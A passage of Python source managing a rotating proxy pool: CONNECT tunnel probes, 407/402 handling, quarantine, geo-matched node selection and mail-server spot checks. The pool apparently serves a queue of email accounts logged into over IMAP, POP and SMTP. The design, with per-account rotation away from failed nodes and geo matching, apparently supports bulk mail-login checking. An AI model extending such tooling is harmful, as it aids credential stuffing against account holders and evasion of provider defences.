        C  anything else                         (untested, or failed)

    A 402 node is therefore only ever drawn when nothing better is left, which is
    the correct role for it: a fallback, not a peer.
    """
    _rebind_scope()
    exclude = set(exclude or ())
    avoid = set(avoid or ())
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        return None

    if live_cfg().get("QUARANTINE_407", True):
        with proxy_quarantine_lock:
            q = set(proxy_quarantine)
        fresh = [p for p in pool if p not in q]
        if not fresh and q:
            with alive_pool_lock:
                whole = set(alive_pool)
            if whole and q >= whole:
                with proxy_quarantine_lock:
                    proxy_quarantine.clear()
                _proxy_407.clear()
                try:
                    proxy_407_until.clear()
                except Exception:
                    pass
                log_startup("Quarantine lifted: every pool node had 407'd - retrying them all.",
                            quiet=True)
                log_probe_event("quarantine auto-lifted (whole pool was quarantined)")
            fresh = pool
        if fresh:
            pool = fresh

    if live_cfg().get("GEO_CALL", False) and domain:
        want = tld_country(domain)
        if want:
            matched = [p for p in pool
                       if str(proxy_meta.get(p, {}).get("country", "")).lower() == want.lower()]
            if matched:
                pool = matched

    if live_cfg().get("QUARANTINE_407", True):
        unparked = [p for p in pool if not _proxy_407_parked(p)]
        if unparked:
            pool = unparked

    # ---- QUALITY TIER: the best tier that still has a usable node ------------
    cand = None
    for _tier in _pool_tiers(pool):
        if not _tier:
            continue
        _c = [p for p in _tier if p not in exclude and p not in avoid]
        if _c:
            cand = _c
            break
    if cand is None:
        for _tier in _pool_tiers(pool):
            _c = [p for p in _tier if p not in exclude]
            if _c:
                cand = _c
                break
    if cand is None:
        cand = [p for p in pool if p not in exclude] or pool

    if not live_cfg().get("RANDOM_ROTATION", True):
        # FIX RR-1 (v13.50): index into cand, not pool. The avoid-set was built
        # and then thrown away, so round-robin re-served a node the account had
        # just failed through - the one thing the avoid-set exists to stop.
        with _rr_lock:
            STATE["rr_index"] = (STATE["rr_index"] + 1) % len(cand)
            return cand[STATE["rr_index"]]

    with _rr_lock:
        last = STATE.get("rr_last")
        if len(cand) > 1 and last in cand:
            cand = [p for p in cand if p != last]
        pick = random.choice(cand)
        STATE["rr_last"] = pick
        return pick
# @@END 069 POOL_SAMPLE

# @@BLOCK 070 TUNNEL_PROBE deps=018,023,052,053,060
def _control_targets(used):
    """A target that is NOT already under test.

    A 407 from a shared provider is not always about the credential: a
    per-sub-user concurrency cap and a plan-state problem look identical. Both
    hit a WEB destination and a MAIL destination the same way; a
    destination-scoped 407 does not. One control CONNECT is the only way to tell
    the two apart without guessing, and it is only spent after a 407.
    """
    seen = set()
    for t in (used or []):
        try:
            seen.add((str(t[0]).lower(), int(t[1])))
        except Exception:
            continue
    for t in PROBE_CONTROL_TARGETS:
        if (str(t[0]).lower(), int(t[1])) not in seen:
            return [t]
    return []


def tunnel_probe(proxy_str, targets=None, timeout=None):
    """Open a REAL CONNECT tunnel through the node and classify the outcome.

    reasons: ok | auth (node-wide credential) | auth_dest (credential accepted,
    this DESTINATION refused) | plan (provider refusing service) | timeout |
    transport | format | nosocks | dead

    A 407 arriving on ANY scheme is an auth refusal, decided AFTER the loops -
    the node's scheme memory is driven by an actual SUCCESS only.

    FIX 407-SCOPE: a 407 used to be charged to the NODE outright, so a pool that
    authenticated fine on 443 and 407'd on 993 quarantined and score-zeroed
    itself. Every 407 is now re-dialled against PROBE_CONTROL_TARGETS first; if
    the control passes the verdict is `auth_dest` (ok=True) and the node keeps
    its score, its strike count and its place in the pool.

    FIX PLAN-1: a 402 / 429 / 503 short-circuits the scheme loop. It used to fall
    through to SOCKS5, which answered "authentication failed" on an HTTP-only
    port and re-labelled the whole node a 407 - so a bandwidth-refused pool read
    as a credential failure.
    """
    out = {"ok": False, "reason": "dead", "latency_ms": 0, "target": "",
           "scheme": None, "error": "", "control": ""}
    if not proxy_str:
        out["ok"] = True
        out["reason"] = "ok"
        return out
    info = parse_proxy(proxy_str)
    if not info:
        out["reason"] = "format"
        out["error"] = "parse_proxy() returned None (unrecognised line shape)"
        return out
    if info.get("user") and not info.get("pass"):
        # PySocks skips the auth header entirely on a falsy password, so a
        # user@host:port line 407s on every node and reads as a dead pool.
        out["reason"] = "format"
        out["error"] = ("line carries a username but NO password - every CONNECT will "
                        "407; fix the proxies.txt line")
        return out
    if not SOCKS_OK:
        out["reason"] = "nosocks"
        out["error"] = "PySocks not installed"
        return out

    targets = targets or probe_targets()
    try:
        _max_t = max(1, int(live_cfg().get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    except Exception:
        _max_t = PROBE_MAX_TARGETS_DEFAULT
    targets = list(targets)[:_max_t]
    try:
        _second_scheme = bool(live_cfg().get("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT))
    except Exception:
        _second_scheme = PROBE_SECOND_SCHEME_DEFAULT

    budget = float(timeout if timeout is not None else probe_timeout())
    hard_deadline = time.time() + max(1.5, budget)

    errors = []
    auth_schemes = set()
    started_all = time.time()

    def _dial(host, port, label):
        """One target across the scheme order. 'ok' | 'auth' | 'plan' | 'fail'."""
        for _s_idx, ptype in enumerate(_scheme_order(proxy_str)):
            if _s_idx and out["ok"] and not _second_scheme:
                break
            left = hard_deadline - time.time()
            if left <= 0.6:
                break
            attempt_to = max(0.8, min(budget, left))
            s = None
            started = time.time()
            try:
                # HTTP is dialled by hand - the auth header is ours, not PySocks'.
                if ptype == socks.HTTP:
                    s = _raw_http_connect(host, port, info, attempt_to)
                else:
                    kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                          "proxy_port": info["port"], "proxy_rdns": True}
                    if info["user"]:
                        kw["proxy_username"] = info["user"]
                        kw["proxy_password"] = info["pass"]
                    s = socks.create_connection((host, port), timeout=attempt_to, **kw)
                _remember_scheme(proxy_str, ptype)
                out.update(ok=True, reason="ok", scheme=ptype, target=label,
                           latency_ms=int((time.time() - started_all) * 1000))
                return "ok"
            except Exception as e:
                msg = str(e)
                errors.append(f"{label}/{'HTTP' if ptype == socks.HTTP else 'SOCKS5'}: "
                              f"{type(e).__name__}: {msg[:110]}")
                out["target"] = label
                out["latency_ms"] = int((time.time() - started) * 1000)
                if _is_proxy_plan_error(msg):
                    out["reason"] = "plan"
                    return "plan"
                if _is_proxy_auth_fail(msg):
                    auth_schemes.add(ptype)
                    return "auth"
                if isinstance(e, (socket.timeout, TimeoutError)) or "timed out" in msg.lower():
                    if out["reason"] != "auth":
                        out["reason"] = "timeout"
                else:
                    if out["reason"] != "auth":
                        out["reason"] = "transport"
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
        return "fail"

    for host, port, label in targets:
        if time.time() >= hard_deadline:
            errors.append(f"{label}: skipped (node budget spent)")
            break
        _v = _dial(host, port, label)
        if _v == "ok":
            break
        if auth_schemes or _v == "plan":
            break

    # ---- the 407 is disambiguated BEFORE it is charged to the node ----------
    if (not out["ok"]) and auth_schemes:
        for host, port, label in _control_targets(targets):
            if time.time() >= hard_deadline:
                break
            out["control"] = f"{host}:{port}"
            if _dial(host, port, "control:" + label) == "ok":
                out["reason"] = "auth_dest"
                break

    if out["ok"] and out["reason"] != "auth_dest":
        out["reason"] = "ok"
    elif out["reason"] == "plan":
        pass
    elif auth_schemes and out["reason"] != "auth_dest":
        out["reason"] = "auth"

    out["error"] = " ; ".join(errors)[:300]
    return out
# @@END 070 TUNNEL_PROBE

# @@BLOCK 071 PRECHECK_FAST deps=025,041,058,070
def _precheck_tcp(host, port, timeout):
    """Direct TCP reachability, with one retry. Returns (ok, last_error).

    ONE ATTEMPT WAS TOO FEW. A single lost SYN dropped a healthy node for the
    whole cycle, decayed its score through record_proxy_attempt() and took it
    out of alive_pool, so the next cycle re-probed it, failed it again and
    decayed it again. A node that is fine on the provider's own network reads
    "tcp dead" here for ever. Two tries, 1s apart, is the cheap version of the
    retry the tunnel probe already does.
    """
    last = ""
    for i in range(2):
        try:
            with socket.create_connection((host, int(port)), timeout=timeout):
                return True, ""
        except Exception as e:
            last = f"{type(e).__name__}: {e}"
            if i == 0:
                time.sleep(1.0)
    return False, last


def precheck_proxy_fast(proxy_str):
    try:
        # v13.65: THIS RUNS ON PHASE-2 WORKER THREADS and touches the per-user
        # quarantine, circuit-breaker and score tables. Without the rebind a rerun
        # in another tab retargets every module alias and the writes land in the
        # other user's tables. _burst_probe() already rebinds; this one did not.
        _rebind_scope()
        if not proxy_str:
            return True
        if proxy_is_blocked(proxy_str):
            record_probe_result(proxy_str, False, "blocked", error="circuit breaker active")
            return False
        info = parse_proxy(proxy_str)
        if not info:
            record_probe_result(proxy_str, False, "format",
                                error="unrecognised line shape: " + proxy_str[:60])
            log_probe_event(f"FORMAT {proxy_str[:60]}")
            return False
        if not SOCKS_OK:
            record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
            return False
        _tcp_to = float(live_cfg().get("PROXY_PRECHECK_TIMEOUT",
                                       PROXY_PRECHECK_TIMEOUT_DEFAULT))
        _tcp_ok, _tcp_err = _precheck_tcp(info["host"], info["port"], _tcp_to)
        if not _tcp_ok:
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            record_probe_result(proxy_str, False, "tcp",
                                error=f"direct TCP to {info['host']}:{info['port']} failed twice: {_tcp_err}")
            log_probe_event(f"TCPDEAD {info['host']}:{info['port']} ({_tcp_err[:80]})")
            return False

        res = _gated_tunnel(proxy_str)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=res.get("latency_ms", 0),
                            target=res.get("target", ""), scheme=res.get("scheme"),
                            error=res.get("error", ""))

        # FIX 407-SCOPE: auth_dest is a PASS for pool purposes. The node proved it
        # authenticates by clearing the 443 control, so it keeps its score, its
        # strike count and its place in the pool - the destination was the problem.
        # Tested BEFORE the generic ok arm because auth_dest also carries ok=True.
        if res["reason"] == "auth_dest":
            record_proxy_attempt(proxy_str, success=True)
            try:
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        proxy_str, {"fails": 0, "success": 0, "country": "Unknown",
                                    "region": "Unknown", "latency_ms": 0})
                    if res.get("latency_ms"):
                        m["latency_ms"] = int(res["latency_ms"])
            except Exception:
                pass
            log_probe_event(
                f"AUTH407-DEST {info['host']}:{info['port']} -> control "
                f"{res.get('control', '?')} passed; node kept, destination refused")
            return True

        if res["ok"]:
            record_proxy_attempt(proxy_str, success=True)
            try:
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        proxy_str, {"fails": 0, "success": 0, "country": "Unknown",
                                    "region": "Unknown", "latency_ms": 0})
                    if res.get("latency_ms"):
                        m["latency_ms"] = int(res["latency_ms"])
            except Exception:
                pass
            return True

        # FIX PLAN-1: 402 is not a node failure. Record it, park it, keep the
        # score, and report it as its own reason so "dead" stops absorbing it.
        #
        # v13.54: IT NOW RETURNS True. Returning False kept a perfectly alive,
        # perfectly authenticated node OUT of alive_pool and left its success
        # count on 0, so a bandwidth-refused pool probed as "alive, score 80,
        # fails 0, successes 0" and could never be drawn from at all. A 402 is
        # provider-wide: every node answers it identically, so holding the node
        # costs nothing and an empty pool costs everything.
        if res["reason"] == "plan":
            record_proxy_attempt(proxy_str, success=False, is_plan=True)
            log_probe_event(f"PLAN {info['host']}:{info['port']} -> provider refusing "
                            f"service (bandwidth/plan); node kept in pool: {res.get('error', '')[:180]}")
            return True

        if res["reason"] == "auth":
            record_proxy_attempt(proxy_str, success=False, is_network_error=True,
                                 is_proxy_auth=True)
            log_probe_event(f"AUTH407 {info['host']}:{info['port']} -> {res.get('error', '')[:200]}")
        else:
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            if res["reason"] in ("timeout", "dead", "transport"):
                log_probe_event(f"{res['reason'].upper()} {info['host']}:{info['port']} "
                                f"-> {res.get('error', '')[:200]}")
        return False
    except Exception:
        return False
# @@END 071 PRECHECK_FAST

# @@BLOCK 072 RUN_BATCH deps=-
def _run_batch(fn, items, workers, budget):
    """Run fn(item) over items with a HARD wall-clock budget.

    FIX PERF-2: results are keyed by LIST INDEX, not id(). id() of a str is only
    stable while something holds a reference and two equal strings can share one,
    so a duplicate line could be credited twice. Items are materialised once so
    the caller's list cannot be mutated underneath the pool.
    """
    items = list(items or ())
    if not items:
        return [], False
    done = set()
    timed_out = False
    budget = max(1.0, float(budget or 1.0))
    ex = ThreadPoolExecutor(max_workers=max(1, min(int(workers or 1), len(items))))
    f2i = {}
    try:
        for idx, it in enumerate(items):
            f2i[ex.submit(fn, it)] = idx
        try:
            for fut in as_completed(f2i, timeout=budget):
                idx = f2i.get(fut)
                try:
                    if fut.result():
                        done.add(idx)
                except Exception:
                    continue
        except Exception:
            timed_out = True
        # Anything that finished inside the budget but after the sweep tripped.
        for fut, idx in f2i.items():
            if fut.done() and not fut.cancelled():
                try:
                    if fut.result():
                        done.add(idx)
                except Exception:
                    pass
    finally:
        ex.shutdown(wait=False)
    return [it for idx, it in enumerate(items) if idx in done], timed_out
# @@END 072 RUN_BATCH

# @@BLOCK 073 MAIL_SPOT_CHECK deps=015,025,070
def _mail_spot_target():
    """The real mail destination to test the pool against.

    FIX ISO-7 (v13.61): STATE is process-wide, so one user's queue-derived target
    was used by everybody's spot check. The owner's own override wins.

    v13.70 ISO-10: the STATE fallback is gone for the same reason as in
    probe_targets() - a session that had never started a run spot-checked the
    previous user's mail host. No override means the documented fallback.
    """
    try:
        ov = _user_state().get("probe_targets_override") or []
        for h, p, _l in ov:
            if h:
                return (h, int(p))
    except Exception:
        pass
    return MAIL_SPOT_FALLBACK


def mail_dest_spot_check(force: bool = False):
    """CONNECT a few nodes to a MAIL destination and report it.

    v13.54: THE RESULT IS OWNER-STAMPED. STATE["mail_spot"] is process state, so
    without a stamp one user's "the pool cannot reach MAIL ports" banner rendered
    in every other user's sidebar as if it were theirs. The stamp is _gate_scope()
    (block 040), not _cache_owner(): this function also runs on the alive-pool
    daemon thread, where session_state is unreliable, and _gate_scope() is a
    plain string refreshed on the script thread. Readers (blocks 077, 080, 105)
    drop a record whose stamp is not their own.

    v13.64: a 402 gets its OWN column. It used to land in `other`, so a pool whose
    whole plan was spent produced pass=0 / 407=0 / other=3 and every banner in the
    app looked at `auth` only - the spot check was shouting and nothing listened.
    """
    if not force and not live_cfg().get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        return
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        STATE["mail_spot"] = {"ts": time.time(), "host": "", "port": 0, "ok": 0,
                              "auth": 0, "plan": 0, "other": 0, "n": 0,
                              "error": "empty pool", "user": _gate_scope()}
        return
    host, port = _mail_spot_target()
    sample = random.sample(pool, min(MAIL_SPOT_NODES, len(pool)))
    ok = auth = other = plan_n = 0
    err = ""
    for p in sample:
        try:
            res = _gated_tunnel(p, timeout=MAIL_SPOT_TIMEOUT,
                                targets=[(host, port, "mailspot")])
        except Exception as e:
            other += 1
            err = err or f"{type(e).__name__}: {str(e)[:120]}"
            continue
        # FIX 407-SCOPE: only a plain `ok` is a real pass against the MAIL port.
        # `auth_dest` means the node authenticated but the destination refused it,
        # so it belongs in the auth column - counting it as a pass would hide the
        # very thing this check exists to report.
        if res.get("ok") and res.get("reason") == "ok":
            ok += 1
        elif res.get("reason") in ("auth", "auth_dest"):
            auth += 1
            err = err or (res.get("error", "") or "")
        elif res.get("reason") == "plan":
            plan_n += 1
            err = err or (res.get("error", "") or "")
        else:
            other += 1
            err = err or (res.get("error", "") or "")
    STATE["mail_spot"] = {"ts": time.time(), "host": host, "port": int(port), "ok": ok,
                          "auth": auth, "plan": plan_n, "other": other,
                          "n": len(sample), "error": (err or "")[:300],
                          "user": _gate_scope()}
    line = (f"mail-dest spot check {host}:{port} -> pass={ok} 407={auth} "
            f"402={plan_n} other={other} of {len(sample)} node(s)")
    log_probe_event(line)
    if auth and not ok:
        log_probe_event("*** MAIL destination refused on every sampled node. Each node "
                        "was re-tested on 443 first - see 'auth' (node-wide) vs "
                        "'auth_dest' (destination only) in the histogram ***")
    if plan_n and not ok:
        log_probe_event("*** every sampled node answered 402 Payment Required on the MAIL "
                        "destination - the plan is refusing service; those nodes "
                        "authenticate and are alive ***")
# @@END 073 MAIL_SPOT_CHECK

# @@BLOCK 074 REFRESH_POOL deps=013,014,025,058,069,071,073
def _collapse_by_hostport(lines, reasons):
    """One entry per (host:port, SUB-USER) pair. No per-IP cap.

    v13.55: THE COLLAPSE WAS TOO STRONG. 122 fetched lines are ~12 sub-users
    stacked on 9 IPs. Pass-first kept ONE line per IP, and because the provider
    lists the first sub-user's lines first, that sub-user claimed every IP - the
    pool became 9 nodes on one sub-user while PROXY_SUBUSER_CONCURRENCY is 1, so
    nine nodes allowed exactly one concurrent tunnel.

    v13.58: THE CAP IS GONE. It went to 2, then 4, and each time a key you pay for
    was collapsed away before you could see it - 18 keys produced a 32-line pool
    and a 5-row health table. You are billed per API KEY, so every key keeps its
    own line and its own row. The per-IP gate still caps CONCURRENCY at
    PROXY_IP_CONCURRENCY; the extra lines only widen ROTATION.

    Pass 1: the pair PASSED.
    Pass 2: the pair answered 402 - alive, authenticates, out of bandwidth.
    Pass 3: anything else, so a dead endpoint stays visible instead of vanishing.
    """
    _kept, _seen = {}, set()

    def _pair(p):
        _i = parse_proxy(p)
        if not _i:
            return None
        return (f"{_i['host']}:{_i['port']}", (_i.get("user") or "").lower())

    for _p in lines:
        _k = _pair(_p)
        if not _k or _k in _seen or reasons.get(_p) != "ok":
            continue
        _seen.add(_k)
        _kept[_k] = _p

    for _p in lines:
        _k = _pair(_p)
        if not _k or _k in _seen or reasons.get(_p) != "plan":
            continue
        _seen.add(_k)
        _kept[_k] = _p

    for _p in lines:
        _k = _pair(_p)
        if not _k or _k in _seen:
            continue
        _seen.add(_k)
        _kept[_k] = _p

    return list(_kept.values())


def refresh_alive_pool(force: bool = False, budget: float = None):
    _rebind_scope()
    # v13.65: PINNED. _US is a module global and a rerun in another tab rebinds
    # it, so the closing `finally` used to clear probe_in_flight and stamp
    # last_probe_ts on whoever reran last - leaving the real owner marked
    # "probe in flight" for ever.
    _us = _US
    budget = float(budget if budget is not None else PROBE_BATCH_BUDGET)

    if (not force) and (not _any_run_active()) \
            and not live_cfg().get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        return

    if not _PROBE_OWNER_LOCK.acquire(blocking=False):
        if not force:
            return
        _t0 = time.time()
        while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < budget:
            time.sleep(0.2)
        if not _PROBE_OWNER_LOCK.acquire(blocking=False):
            return

    if (not force) and _any_run_active():
        last = _us.get("last_probe_ts", 0.0)
        if last and (time.time() - last) < PROBER_STALE_WHILE_RUNNING:
            try:
                _PROBE_OWNER_LOCK.release()
            except Exception:
                pass
            return

    _us["probe_in_flight"] = True
    try:
        try:
            raw = get_filtered_active_proxies(quiet=True)
        except Exception:
            raw = []
        if not raw:
            with alive_pool_lock:
                alive_pool[:] = []
            log_startup("Alive pool refreshed: proxies.txt is empty.", quiet=True)
            return

        # FIX NOLIMIT-1 (v13.59): the caller's budget was a fixed 120s, so a
        # 2000-line file kept only the first few hundred lines that finished and
        # silently abandoned the rest. The budget now scales with the file at 4s
        # per line and is bounded only by PROBE_BATCH_MAX.
        try:
            _scaled = min(PROBE_BATCH_MAX, max(budget, len(raw) * 4.0))
        except Exception:
            _scaled = budget
        if _scaled > budget:
            log_probe_event(f"probe budget scaled for {len(raw)} line(s): "
                            f"{budget:.0f}s -> {_scaled:.0f}s")
            budget = _scaled

        # FIX SCORE-5 (v13.49): a FORCED probe re-measures every node, so the
        # accumulated `fails` is stale history from a different provider state.
        if force:
            with proxy_lock:
                for _p in raw:
                    _m = proxy_meta.setdefault(
                        _p, {"fails": 0, "success": 0, "country": "Unknown",
                             "region": "Unknown", "latency_ms": 0})
                    _m["fails"] = 0
                    _m["score"] = compute_real_score(_m.get("success", 0), 0)
            log_probe_event("forced probe: node fail counts reset, scores recomputed")

        try:
            _sample = max(0, int(live_cfg().get("PROBE_SAMPLE_MAX", 0)))
        except Exception:
            _sample = 0
        if _sample and len(raw) > _sample:
            raw = random.sample(raw, _sample)
            log_probe_event(f"probe sample: {_sample} node(s) this cycle")

        try:
            file_keys = set(load_proxies(quiet=True))
        except Exception:
            file_keys = set()
        if file_keys:
            with proxy_lock:
                for k in list(proxy_meta.keys()):
                    if k not in file_keys:
                        proxy_meta.pop(k, None)
            with probe_stats_lock:
                for k in list(probe_stats.keys()):
                    if k not in file_keys:
                        probe_stats.pop(k, None)
            with proxy_quarantine_lock:
                for k in list(proxy_quarantine):
                    if k not in file_keys:
                        proxy_quarantine.discard(k)
                        _proxy_407.pop(k, None)
            with _proxy_scheme_lock:
                for k in list(_proxy_scheme.keys()):
                    if k not in file_keys:
                        _proxy_scheme.pop(k, None)

        if not live_cfg().get("PROXY_TEST_FLIGHT", True):
            with alive_pool_lock:
                alive_pool[:] = raw
            enrich_proxy_geo(raw)
            save_proxy_meta()
            log_startup(f"Test Flight OFF: pool set to all {len(raw)} candidate(s) "
                        f"without probing.", quiet=True)
            try:
                mail_dest_spot_check()
            except Exception as _mse:
                log_probe_event(f"mail-dest spot check failed: {_mse}")
            return

        _tgts = probe_targets()
        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={live_cfg().get('PROBE_TARGET')} "
                        f"({[t[0] for t in _tgts]}), budget={budget:.0f}s, "
                        f"workers={probe_workers()}, runs_active={_us.get('runs_active', 0)}")

        live, batch_timed_out = _run_batch(precheck_proxy_fast, raw, probe_workers(), budget)

        # FIX POOL-DUP (v13.49) + v13.58 per-credential collapse.
        try:
            with probe_stats_lock:
                _psnap = {k: (v.get("reason") or "") for k, v in probe_stats.items()}
        except Exception:
            _psnap = {}
        if live:
            _before = len(live)
            live = _collapse_by_hostport(live, _psnap)
            if len(live) != _before:
                _ips_seen = len({(parse_proxy(p) or {}).get("host") for p in live})
                _keys_seen = len({((parse_proxy(p) or {}).get("user") or "").lower()
                                  for p in live})
                log_probe_event(f"pool collapsed by host:port+sub-user: {_before} -> "
                                f"{len(live)} line(s) over {_ips_seen} IP(s) and "
                                f"{_keys_seen} sub-user(s)")

        strict = bool(live_cfg().get("PROBE_STRICT", PROBE_STRICT_DEFAULT))
        note = ""
        if not live and not strict:
            live = raw
            note = " | STRICT OFF: fell back to the raw pool"
        elif not live and batch_timed_out:
            note = f" | probe batch budget ({budget:.0f}s) spent"

        if not live and _any_run_active():
            with alive_pool_lock:
                still = [p for p in alive_pool if p]
            if still:
                note += f" | kept the current {len(still)}-node pool (run in flight)"
                log_probe_event(f"refresh kept pool ({len(still)} nodes) - 0 passed under load")
                try:
                    mail_dest_spot_check()
                except Exception as _mse:
                    log_probe_event(f"mail-dest spot check failed: {_mse}")
                return

        with alive_pool_lock:
            alive_pool[:] = live
        enrich_proxy_geo(live)
        save_proxy_meta()
        _us["last_probe_ts"] = time.time()
        _us["probe_runs"] = int(_us.get("probe_runs", 0)) + 1

        try:
            mail_dest_spot_check()
        except Exception as _mse:
            log_probe_event(f"mail-dest spot check failed: {_mse}")

        passed, auth, plan_n, timeout_n, dead = probe_summary()
        line = (f"Alive pool refreshed: {len(live)} node(s) passed the tunnel probe "
                f"out of {len(raw)} candidate(s). Probe breakdown -> pass={passed} "
                f"auth407={auth} plan402={plan_n} timeout={timeout_n} dead={dead} | "
                f"target={live_cfg().get('PROBE_TARGET')} budget={budget:.0f}s strict={strict}{note}")
        log_startup(line, quiet=True)
        log_probe_event(f"refresh end: alive={len(live)}/{len(raw)} pass={passed} "
                        f"auth={auth} plan={plan_n} timeout={timeout_n} dead={dead}{note}")
    finally:
        _us["probe_in_flight"] = False
        _us["last_probe_ts"] = time.time()
        try:
            _PROBE_OWNER_LOCK.release()
        except Exception:
            pass
# @@END 074 REFRESH_POOL

# @@BLOCK 075 ALIVE_THREAD deps=013,074
def start_alive_refresher():
    """One prober thread PER SCOPE.

    FIX ISO-6 (v13.59): there was one global "alive-pool" thread. Its tables are
    per-user now, so it would only ever have refreshed whoever happened to start
    it, and the `any(t.name == "alive-pool")` guard made every later user a
    no-op. The scope is pinned on the thread so _gate_scope(), _user_state() and
    every gate resolve to the right owner for its whole life.
    """
    _who = _gate_scope()
    _name = "alive-pool-" + _who
    if any(t.name == _name for t in threading.enumerate()):
        return

    def loop():
        _pin_gate_scope(_who)
        while True:
            try:
                if _any_run_active():
                    refresh_alive_pool()
                    time.sleep(PROBER_BUSY_SLEEP)
                else:
                    refresh_alive_pool()
                    time.sleep(PROBER_IDLE_SLEEP)
            except Exception:
                time.sleep(PROBER_BUSY_SLEEP)

    threading.Thread(target=loop, daemon=True, name=_name).start()


start_alive_refresher()
# @@END 075 ALIVE_THREAD

# @@BLOCK 076 QUEUE_PROBE_TARGETS deps=011,026,068
def _probe_pair_for(email, domain, flags):
    """The AUTO probe target follows the SELECTED protocols."""
    if flags.get("imap"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], 993)
    if flags.get("pop"):
        h = (get_servers(email).get("pop") or [])[:1]
        if h:
            return (h[0], 995)
    if flags.get("smtp"):
        h = _smtp_hosts_for(domain)
        if h:
            return (h[0], 587)
    if flags.get("sieve"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], SIEVE_PORT)
    return None


def _set_probe_targets_from_queue(accounts, cap=1):
    """Resolve the AUTO probe target from the ACTUAL queue. Per user."""
    flags = protocol_flags()
    out, seen_domains, seen_pairs = [], set(), set()
    for raw in accounts or []:
        em = raw.split(":", 1)[0].strip().lower()
        if "@" not in em:
            continue
        dom = em.split("@")[-1]
        if not dom or dom in seen_domains:
            continue
        seen_domains.add(dom)
        try:
            pair = _probe_pair_for(em, dom, flags)
        except Exception:
            pair = None
        if not pair or pair in seen_pairs:
            continue
        seen_pairs.add(pair)
        out.append((pair[0], pair[1], f"auto:{dom}"))
        if len(out) >= cap:
            break
    if out:
        # FIX ISO-7 (v13.61): the override is per user now. STATE is kept as a
        # process mirror so blocks 077 and 105, which still compare and restore
        # through STATE, keep working unchanged.
        STATE["probe_targets_override"] = out
        try:
            _user_state()["probe_targets_override"] = out
        except Exception:
            pass
        log_probe_event(f"probe target AUTO resolved from the queue -> {[o[0] for o in out]}")
    return out
# @@END 076 QUEUE_PROBE_TARGETS

# @@BLOCK 077 FETCH_AND_TEST deps=012,014,015,025,026,052,058,067,070,071,072,073,074
def _burst_probe(proxy_str):
    """PHASE 1 validation: probe at burst width with the concurrency gates BYPASSED.

    The gates exist to stop a LIVE RUN hammering one sub-user. A fetch has no run
    behind it, so gating it just serialises the whole file behind
    PROXY_SUBUSER_CONCURRENCY and a 182-line file takes half an hour.

    A pass is credited immediately. A failure is only RECORDED (probe_stats) and
    never struck - phase 2 re-tests it through precheck_proxy_fast() under the real
    gates, where the accounting happens, so a 407 caused by our own burst is
    corrected rather than believed.

    FIX FETCH-3: A 402 IS A PASS HERE. precheck_proxy_fast() has returned True on
    plan since v13.54 - a spent key is alive and authenticating - but this returned
    bool(res["ok"]) and ok is False for a 402, so every 402 line was dropped in
    phase 1 and, because "plan" was not in the phase-2 filter, was never re-tested.
    Ninety live nodes were deleted before _collapse_by_hostport, whose second pass
    exists precisely to keep them. Also: a cheap single-attempt TCP precheck first,
    so a dead IP fails in ~3s instead of burning the whole 8s probe budget.
    """
    try:
        _rebind_scope()
        if not proxy_str:
            return True
        if proxy_is_blocked(proxy_str):
            record_probe_result(proxy_str, False, "blocked",
                                error="circuit breaker active")
            return False
        info = parse_proxy(proxy_str)
        if not info:
            record_probe_result(proxy_str, False, "format",
                                error="unrecognised line shape: " + proxy_str[:60])
            return False
        if not SOCKS_OK:
            record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
            return False
        try:
            _tcp_to = min(3.0, float(live_cfg().get(
                "PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT)))
        except Exception:
            _tcp_to = 3.0
        try:
            _s = socket.create_connection((info["host"], int(info["port"])),
                                          timeout=_tcp_to)
            _s.close()
        except Exception as _tcpe:
            record_probe_result(proxy_str, False, "tcp",
                                error=f"direct TCP to {info['host']}:{info['port']} "
                                      f"failed: {_tcpe}")
            return False
        res = tunnel_probe(proxy_str)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=res.get("latency_ms", 0),
                            target=res.get("target", ""), scheme=res.get("scheme"),
                            error=res.get("error", ""))
        if res["ok"]:
            record_proxy_attempt(proxy_str, success=True)
            return True
        if res["reason"] == "plan":
            # Alive, authenticating, out of bandwidth. KEPT, exactly as
            # precheck_proxy_fast keeps it - never struck, never rotated away.
            record_proxy_attempt(proxy_str, success=False, is_plan=True)
            return True
        return False
    except Exception:
        return False


def _fetch_targets(prev_override):
    """The target the FETCH validates against - and only if it answers.

    FIX FETCH-4: THE FETCH PROBED A HOST NOBODY HAD CONFIRMED. It used to swap in
    imap.gmail.com:993 for the duration, but it wrote STATE["probe_targets_override"]
    while probe_targets() prefers the PER-USER copy that a previous Start had
    already filled with the queue domain - so the swap was invisible and every line
    was dialled against a guessed apex on 993. All 80 timeouts in the last run were
    the full 8025 ms budget against a host with no listener, and the whole file
    read dead.

    The queue target is used only if a direct 3s TCP dial from this host succeeds.
    Otherwise the fetch falls back to the 443 control, which is the clean baseline
    the probe is designed around. One dial, and the log says which way it went.
    """
    fallback = [(PROBE_CONTROL_TARGETS[0][0], PROBE_CONTROL_TARGETS[0][1], "443 control")]
    cand = None
    for _h, _p, _l in (prev_override or []):
        if _h:
            try:
                cand = (str(_h), int(_p), "queue:" + str(_h))
            except Exception:
                cand = None
            break
    if not cand:
        return fallback, "no queue target set - validating on the 443 control"
    try:
        _s = socket.create_connection((cand[0], cand[1]), timeout=3.0)
        _s.close()
        return [cand], (f"queue target {cand[0]}:{cand[1]} answers from this host "
